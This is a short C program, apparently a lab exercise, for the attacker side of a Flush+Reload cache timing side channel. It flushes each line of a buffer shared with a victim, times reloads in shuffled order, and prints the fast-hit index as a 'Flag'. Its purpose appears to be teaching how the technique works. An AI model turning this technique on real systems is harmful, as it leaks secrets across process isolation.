#include "util.h"
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#define THRESHOLD 150

// waits n cycles
static void wait(int n)
{
    while (n--)
        asm volatile("" ::: "memory");
}

int main()
{
    int flag = -1;

    // buf is shared between the attacker and the victim
    char *buf = allocate_shared_buffer();

    // shuffle probe order so the prefetcher can't predict our accesses
    // fisher yates shuffle
    int order[SEC_RANGE];
    for (int i = 0; i < SEC_RANGE; i++)
        order[i] = i;
    srand(time(NULL) ^ getpid()); // get random seed
    for (int i = SEC_RANGE - 1; i > 0; i--)
    {
        int j = rand() % (i + 1);
        int t = order[i];
        order[i] = order[j];
        order[j] = t;
    }

    // flush and reload one line at a time
    for (int k = 0; k < SEC_RANGE; k++)
    {
        int i = order[k];
        ADDR_PTR addr = (ADDR_PTR)(buf + i * ALIGN);
        clflush(addr);
        wait(800);
        CYCLES t = measure_one_block_access_time(addr);
        if (t < THRESHOLD)
            flag = i;
    }

    printf("Flag: %d\n", flag);

    deallocate_shared_buffer(buf);
    return 0;
}